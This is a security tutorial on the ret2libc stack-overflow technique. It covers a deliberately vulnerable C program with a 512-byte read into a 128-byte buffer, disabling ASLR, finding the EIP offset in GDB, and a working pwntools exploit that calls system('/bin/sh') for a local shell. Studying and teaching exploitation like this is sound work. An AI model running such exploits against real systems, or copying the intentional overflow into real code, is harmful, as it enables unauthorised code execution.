# Ret2libc ( return to libc attack )

Prerequisite: 

* NX Enabled
* No Canary
* PIE Disabled
* No Fortify

# ret2libc definition

As the name says, `ret2libc` which means, this technique involves code reusual from the dynamically linked file `libc.so.6`, since most of the binary is dynamically linked, all the functions which are predefined, for example `strcmp`, `puts`, `printf`, `gets` etc. are stored in the `libc.so.6`, when you dynamically link  an ELF file, these functions are stored in a section named as `.got.plt` which contains the `GOT` address, which is the address which imports the addresses of function in the runtime. Since, this section is about how to do `ret2libc` when `ASLR` is disabled.  It is simple from what you have been doing in stack overflow with a `ret2func` technique. In `ret2win` payload looks like:

```r
----------------------------------------------------
| padding to EIP | address of the win function     |
----------------------------------------------------
```

In `ret2libc` technique, our payload looks like:-

```r
--------------------------------------------------------------------------
| padding to EIP | function from libc.so.6 | dummy ret | args1.....argsN |
--------------------------------------------------------------------------
```
Where `N` being the number of arguments a function takes.

# Practical Experience

Now, let's take a binary and see how to use `ret2libc`:-

```C

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int vulnerable() {
	printf("> ");
	fflush(stdout);

	char buffer[128];
	read(STDIN_FILENO, &buffer[0], 512);
}

int main(int argc, char** argv) {
	vulnerable();

	return EXIT_SUCCESS;
}```

Compiling it with:

```r
d4mianwayne@oracle:/tmp/train$ gcc m32 -fno-stack-protector -no-pie ret2libc.c -o ret2libc
d4mianwayne@oracle:/tmp/train$ ./ret2libc 
> lol
d4mianwayne@oracle:/tmp/train$ checksec ret2libc
[*] '/tmp/train/ret2libc'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

`NX Enabled` which means we can't just throw in the shellcode and make it executable, hence spawning a shell. Disabling the `ASLR`:-

```r
d4mianwayne@oracle:/tmp/train$ cat /proc/sys/kernel/randomize_va_space 
2
d4mianwayne@oracle:/tmp/train$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 
[sudo] password for d4mianwayne: 
0
d4mianwayne@oracle:/tmp/train$ cat /proc/sys/kernel/randomize_va_space 
0
```

### Finding Offset to `EIP`

Now, everything is good, let's check the offset for EIP:-

```r

warning: ~/.gdbinit.local: No such file or directory
Reading symbols from ret2libc...(no debugging symbols found)...done.
GEF for linux ready, type `gef' to start, `gef config' to configure
78 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
[*] 2 commands could not be loaded, run `gef missing` to know why.
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: /tmp/train/ret2libc 
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.

-- snip --

$eip   : 0x6261616b ("kaab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffceb0│+0x0000: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"	 ← $esp
0xffffceb4│+0x0004: "maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabya[...]"
0xffffceb8│+0x0008: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab\n[...]"
0xffffcebc│+0x000c: 0x6261616f
0xffffcec0│+0x0010: 0x62616170
0xffffcec4│+0x0014: 0x62616171
0xffffcec8│+0x0018: 0x62616172
0xffffcecc│+0x001c: 0x62616173
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6261616b
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2libc", stopped 0x6261616b in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x6261616b in ?? ()


gef➤  pattern search 0x6261616b
[+] Searching '0x6261616b'
[+] Found at offset 140 (little-endian search) likely
```
### Finding Address of `system` and `/bin/sh`

The offset for `EIP` Is 140. Now, let's see how our payload is going to be, since we basically want to do `system("/bin/sh")`, all we have to do is get the address of `system` and `/bin/sh`. 

Let's find out the address:-

```r
 ✘ d4mianwayne@oracle  /tmp/train  ldd ret2libc
	linux-gate.so.1 (0xf7fd5000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf7dd5000)
	/lib/ld-linux.so.2 (0xf7fd6000)
 d4mianwayne@oracle  /tmp/train  strings -a -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 17e0cf /bin/sh
```

This is the offset of the string `/bin/sh` in `libc.so.6`, and ASLR is disabled, so the base address of `libc.so.6` is `0xf7dd5000`. Then the address of `system` would be and `/bin/sh` would be-


```r
gef➤  p 0xf7dd5000 + 0x17e0cf
$1 = 0xf7f530cf
gef➤  x/s 0xf7f530cf
0xf7f530cf:	"/bin/sh"
gef➤  p system
$2 = {int (const char *)} 0xf7e12200 <__libc_system>
gef➤  
```


### Pwning Time

Payload would be:-


```r
------------------------------------------------------
| "A"*140 | system_addr + dummy_ret + /bin/sh address|
------------------------------------------------------
```

> Note: `dummy_ret` could be `0xdeadbeef` or `ret;`

Now, let's make an exploit and run it:-

```python
from pwn import *

p = process("./ret2libc")

bin_sh = 0xf7f530cf
system_addr =  0xf7e12200 


payload = b"A"*140
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendlineafter(b"> ", payload)
p.interactive()
```

Running the exploit:-

```r
 d4mianwayne@oracle  /tmp/train  python3 ret2libc.py 
[+] Starting local process './ret2libc': pid 9167
[*] Switching to interactive mode
$ ls
ret2libc  ret2libc.c  ret2libc.py
$ 
[*] Interrupted
```

Next up is: ASLR enabled `ret2libc` attack.